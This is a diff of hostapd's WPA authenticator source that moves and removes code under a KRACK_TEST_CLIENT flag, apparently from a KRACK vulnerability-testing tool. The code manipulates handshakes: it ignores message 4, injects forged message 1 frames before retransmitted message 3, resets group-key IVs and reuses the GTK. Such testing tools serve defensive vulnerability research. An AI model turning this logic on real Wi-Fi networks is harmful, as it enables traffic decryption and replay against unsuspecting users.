@@ -65,14 +65,8 @@ static void wpa_group_put(struct wpa_authenticator *wpa_auth,
 			  struct wpa_group *group);
 static u8 * ieee80211w_kde_add(struct wpa_state_machine *sm, u8 *pos);
 
-#ifdef KRACK_TEST_CLIENT
-#define HANDSHAKE_TRANSMIT_INTERVAL 2
-static const u32 eapol_key_timeout_first = HANDSHAKE_TRANSMIT_INTERVAL * 1000; /* ms */
-static const u32 eapol_key_timeout_subseq = HANDSHAKE_TRANSMIT_INTERVAL * 1000; /* ms */
-#else
 static const u32 eapol_key_timeout_first = 100; /* ms */
 static const u32 eapol_key_timeout_subseq = 1000; /* ms */
-#endif
 static const u32 eapol_key_timeout_first_group = 500; /* ms */
 static const u32 eapol_key_timeout_no_retrans = 4000; /* ms */
 
@@ -80,14 +74,6 @@ static const u32 eapol_key_timeout_no_retrans = 4000; /* ms */
 static const int dot11RSNAConfigPMKLifetime = 43200;
 static const int dot11RSNAConfigPMKReauthThreshold = 70;
 static const int dot11RSNAConfigSATimeout = 60;
-
-#ifdef KRACK_TEST_CLIENT
-/* globals to control the handshake being tested */
-#define TEST_4WAY	1
-#define TEST_GROUP	2
-int poc_testing_handshake = TEST_4WAY;
-int poc_testing_tptk_construction = TEST_TPTK_NONE;
-#endif
 
 static inline int wpa_auth_mic_failure_report(
 	struct wpa_authenticator *wpa_auth, const u8 *addr)
@@ -188,7 +174,7 @@ static inline int wpa_auth_start_ampe(struct wpa_authenticator *wpa_auth,
 #endif /* CONFIG_MESH */
 
 #ifdef KRACK_TEST_CLIENT
-static void poc_log(const u8 *clientmac, const char *format, ...)
+void poc_log(const u8 *clientmac, const char *format, ...)
 {
 	time_t rawtime;
 	struct tm *timeinfo;
@@ -324,25 +310,6 @@ static void wpa_rekey_gtk(void *eloop_ctx, void *timeout_ctx)
 	}
 }
 
-#ifdef KRACK_TEST_CLIENT
-void poc_start_testing_group_handshake(struct wpa_authenticator *wpa_auth)
-{
-	// Start to periodically execute the group key handshake every 2 seconds
-	wpa_auth->conf.wpa_group_rekey = HANDSHAKE_TRANSMIT_INTERVAL;
-	eloop_cancel_timeout(wpa_rekey_gtk, wpa_auth, NULL);
-	eloop_register_timeout(wpa_auth->conf.wpa_group_rekey,
-			       0, wpa_rekey_gtk, wpa_auth, NULL);
-
-	poc_testing_handshake = TEST_GROUP;
-	poc_log(NULL, "starting group key handshake tests\n");
-}
-
-void poc_test_tptk_construction(struct wpa_authenticator *wpa_auth, int test_type)
-{
-	poc_testing_tptk_construction = test_type;
-}
-#endif
-
 
 static void wpa_rekey_ptk(void *eloop_ctx, void *timeout_ctx)
 {
@@ -471,11 +438,6 @@ struct wpa_authenticator * wpa_init(const u8 *addr,
 	os_memcpy(&wpa_auth->conf, conf, sizeof(*conf));
 	wpa_auth->cb = cb;
 	wpa_auth->cb_ctx = cb_ctx;
-
-#ifdef KRACK_TEST_CLIENT
-	wpa_auth->conf.wpa_pairwise_update_count = 4000;
-	wpa_auth->conf.wpa_group_update_count = 4000;
-#endif
 
 	if (wpa_auth_gen_wpa_ie(wpa_auth)) {
 		wpa_printf(MSG_ERROR, "Could not generate WPA IE.");
@@ -1046,20 +1008,6 @@ void wpa_receive(struct wpa_authenticator *wpa_auth,
 		    key_data_length == AES_BLOCK_SIZE)) {
 		msg = PAIRWISE_4;
 		msgtxt = "4/4 Pairwise";
-
-#ifdef KRACK_TEST_CLIENT
-		if (poc_testing_handshake == TEST_4WAY)
-		{
-			// Still mark connection as complete, so we do receive and accept encrypted data
-			if (sm->keycount <= 0) {
-				wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_authorized, 1);
-				sm->keycount = 1;
-			}
-
-			//poc_log(sm->addr, "Ignoring Msg4/4\n");
-			return;
-		}
-#endif
 	} else {
 		msg = PAIRWISE_2;
 		msgtxt = "2/4 Pairwise";
@@ -1225,10 +1173,14 @@ continue_processing:
 	case PAIRWISE_4:
 		if (sm->wpa_ptk_state != WPA_PTK_PTKINITNEGOTIATING ||
 		    !sm->PTK_valid) {
+#ifdef KRACK_TEST_CLIENT
+			poc_log(sm->addr, "received a new message 4\n");
+#else
 			wpa_auth_vlogger(wpa_auth, sm->addr, LOGGER_INFO,
 					 "received EAPOL-Key msg 4/4 in "
 					 "invalid state (%d) - dropped",
 					 sm->wpa_ptk_state);
+#endif
 			return;
 		}
 		break;
@@ -2964,50 +2916,6 @@ SM_STATE(WPA_PTK, PTKINITNEGOTIATING)
 		return;
 	}
 
-#ifdef KRACK_TEST_CLIENT
-	if (poc_testing_handshake == TEST_4WAY && sm->TimeoutCtr > 1 && !sm->pairwise_set) {
-		poc_log(sm->addr, "already installing pairwise key\n");
-		enum wpa_alg alg = wpa_cipher_to_alg(sm->pairwise);
-		int klen = wpa_cipher_key_len(sm->pairwise);
-		if (wpa_auth_set_key(sm->wpa_auth, 0, alg, sm->addr, 0,
-				     sm->PTK.tk, klen)) {
-			wpa_sta_disconnect(sm->wpa_auth, sm->addr, WLAN_REASON_PREV_AUTH_NOT_VALID);
-			return;
-		}
-		sm->pairwise_set = TRUE;
-	}
-
-	// When testing for Temporal TPK construction (e.g. wpa_supplicant 2.6 attack), forge a message 1
-	// with the current and a random ANonce before retransmitted message 3's.
-	if (sm->TimeoutCtr > 1 && poc_testing_tptk_construction != TEST_TPTK_NONE) {
-		u8 replay_counter[WPA_REPLAY_COUNTER_LEN];
-		u8 random_anonce[WPA_NONCE_LEN];
-		u8 *anonce = NULL;
-
-		memcpy(replay_counter, sm->key_replay[0].counter, WPA_REPLAY_COUNTER_LEN);
-		random_get_bytes(random_anonce, WPA_NONCE_LEN);
-
-		// Note: this message 1 is sent using link-layer encryption. This is what we want.
-		// In practice an implementation may accept plaintext message 1's due to race conditions,
-		// were we just send it encrypted so we simulate always winning these race conditions.
-		poc_log(sm->addr, "Injecting Msg1 (%s) before Msg3 to test TPTK construction attack\n",
-			poc_testing_tptk_construction == TEST_TPTK_RAND ? "with random ANonce" : "with same ANonce");
-
-		anonce = poc_testing_tptk_construction == TEST_TPTK_RAND ? random_anonce : sm->ANonce;
-		__wpa_send_eapol(sm->wpa_auth, sm,
-			 WPA_KEY_INFO_ACK | WPA_KEY_INFO_KEY_TYPE, NULL,
-			 anonce, NULL, 0, 0, 0, 0);
-
-		// The replay counter should not be modified when sending the forged Msg1
-		memcpy(sm->key_replay[0].counter, replay_counter, WPA_REPLAY_COUNTER_LEN);
-	}
-
-	// Reset transmit packet number of the group key used by the kernel/driver, so
-	// we can detect if clients will accept re-used packet numbers (IVs) in broadcast
-	// data frames. Debug output is printed below.
-	wpa_group_config_group_keys(sm->wpa_auth, sm->group);
-#endif
-
 	/* Send EAPOL(1, 1, 1, Pair, P, RSC, ANonce, MIC(PTK), RSNIE, [MDIE],
 	   GTK[GN], IGTK, [FTIE], [TIE * 2])
 	 */
@@ -3164,13 +3072,6 @@ SM_STATE(WPA_PTK, PTKINITNEGOTIATING)
 				  addr, sizeof(addr), NULL, 0);
 	}
 #endif /* CONFIG_P2P */
-
-#ifdef KRACK_TEST_CLIENT
-	// Note: this was done in the beginning of the function, but we want the
-	//       output only to occur at this point.
-	if (poc_testing_handshake == TEST_4WAY)
-		poc_log(sm->addr, "Resetting Tx IV of group key and sending Msg3/4\n");
-#endif
 
 	wpa_send_eapol(sm->wpa_auth, sm,
 		       (secure ? WPA_KEY_INFO_SECURE : 0) |
@@ -3523,20 +3424,13 @@ static int wpa_gtk_update(struct wpa_authenticator *wpa_auth,
 {
 	int ret = 0;
 
-#ifdef KRACK_TEST_CLIENT
-	if (poc_testing_handshake == TEST_GROUP) {
-		//printf(">>> Reusing previous GTK as new GTK: %02X %02X %02X %02X ..\n", group->GTK[group->GN - 1][0],
-		//	group->GTK[group->GN - 1][1], group->GTK[group->GN - 1][2], group->GTK[group->GN - 1][3]);
-	} else
-#endif
-	{
-		os_memcpy(group->GNonce, group->Counter, WPA_NONCE_LEN);
-		inc_byte_array(group->Counter, WPA_NONCE_LEN);
-		if (wpa_gmk_to_gtk(group->GMK, "Group key expansion",
-				   wpa_auth->addr, group->GNonce,
-				   group->GTK[group->GN - 1], group->GTK_len) < 0)
-			ret = -1;
-	}
+	os_memcpy(group->GNonce, group->Counter, WPA_NONCE_LEN);
+	inc_byte_array(group->Counter, WPA_NONCE_LEN);
+	if (wpa_gmk_to_gtk(group->GMK, "Group key expansion",
+			   wpa_auth->addr, group->GNonce,
+			   group->GTK[group->GN - 1], group->GTK_len) < 0)
+		ret = -1;
+
 	wpa_hexdump_key(MSG_DEBUG, "GTK",
 			group->GTK[group->GN - 1], group->GTK_len);
 
@@ -3706,16 +3600,9 @@ static void wpa_group_setkeys(struct wpa_authenticator *wpa_auth,
 	group->changed = TRUE;
 	group->wpa_group_state = WPA_GROUP_SETKEYS;
 	group->GTKReKey = FALSE;
-#ifdef KRACK_TEST_CLIENT
-	if (poc_testing_handshake == TEST_GROUP) {
-		//printf(">>> %s: not chaning keyidx of new group key\n", __FUNCTION__);
-	} else
-#endif
-	{
-		tmp = group->GM;
-		group->GM = group->GN;
-		group->GN = tmp;
-	}
+	tmp = group->GM;
+	group->GM = group->GN;
+	group->GN = tmp;
 #ifdef CONFIG_IEEE80211W
 	tmp = group->GM_igtk;
 	group->GM_igtk = group->GN_igtk;
@@ -4713,9 +4600,15 @@ int wpa_auth_resend_m1(struct wpa_state_machine *sm, int change_anonce,
 
 	wpa_auth_logger(sm->wpa_auth, sm->addr, LOGGER_DEBUG,
 			"sending 1/4 msg of 4-Way Handshake (TESTING)");
+#ifdef KRACK_TEST_CLIENT
+	__wpa_send_eapol(sm->wpa_auth, sm,
+		       WPA_KEY_INFO_ACK | WPA_KEY_INFO_KEY_TYPE, NULL,
+		       anonce, NULL, 0, 0, 0, 0);
+#else
 	wpa_send_eapol(sm->wpa_auth, sm,
 		       WPA_KEY_INFO_ACK | WPA_KEY_INFO_KEY_TYPE, NULL,
 		       anonce, NULL, 0, 0, 0);
+#endif
 	return 0;
 }
 
@@ -4875,6 +4768,15 @@ int wpa_auth_resend_m3(struct wpa_state_machine *sm,
 	}
 #endif /* CONFIG_IEEE80211R_AP */
 
+#ifdef KRACK_TEST_CLIENT
+	__wpa_send_eapol(sm->wpa_auth, sm,
+		       (secure ? WPA_KEY_INFO_SECURE : 0) |
+		       (wpa_mic_len(sm->wpa_key_mgmt, sm->pmk_len) ?
+			WPA_KEY_INFO_MIC : 0) |
+		       WPA_KEY_INFO_ACK | WPA_KEY_INFO_INSTALL |
+		       WPA_KEY_INFO_KEY_TYPE,
+		       _rsc, sm->ANonce, kde, pos - kde, keyidx, encr, 0);
+#else
 	wpa_send_eapol(sm->wpa_auth, sm,
 		       (secure ? WPA_KEY_INFO_SECURE : 0) |
 		       (wpa_mic_len(sm->wpa_key_mgmt, sm->pmk_len) ?
@@ -4882,6 +4784,7 @@ int wpa_auth_resend_m3(struct wpa_state_machine *sm,
 		       WPA_KEY_INFO_ACK | WPA_KEY_INFO_INSTALL |
 		       WPA_KEY_INFO_KEY_TYPE,
 		       _rsc, sm->ANonce, kde, pos - kde, keyidx, encr);
+#endif
 	os_free(kde);
 	return 0;
 }
@@ -4938,6 +4841,15 @@ int wpa_auth_resend_group_m1(struct wpa_state_machine *sm,
 	sm->eapol_status_cb_ctx1 = ctx1;
 	sm->eapol_status_cb_ctx2 = ctx2;
 
+#ifdef KRACK_TEST_CLIENT
+	__wpa_send_eapol(sm->wpa_auth, sm,
+		       WPA_KEY_INFO_SECURE |
+		       (wpa_mic_len(sm->wpa_key_mgmt, sm->pmk_len) ?
+			WPA_KEY_INFO_MIC : 0) |
+		       WPA_KEY_INFO_ACK |
+		       (!sm->Pair ? WPA_KEY_INFO_INSTALL : 0),
+		       rsc, NULL, kde, kde_len, gsm->GN, 1, 0);
+#else
 	wpa_send_eapol(sm->wpa_auth, sm,
 		       WPA_KEY_INFO_SECURE |
 		       (wpa_mic_len(sm->wpa_key_mgmt, sm->pmk_len) ?
@@ -4945,6 +4857,7 @@ int wpa_auth_resend_group_m1(struct wpa_state_machine *sm,
 		       WPA_KEY_INFO_ACK |
 		       (!sm->Pair ? WPA_KEY_INFO_INSTALL : 0),
 		       rsc, NULL, kde, kde_len, gsm->GN, 1);
+#endif
 
 	os_free(kde_buf);
 	return 0;
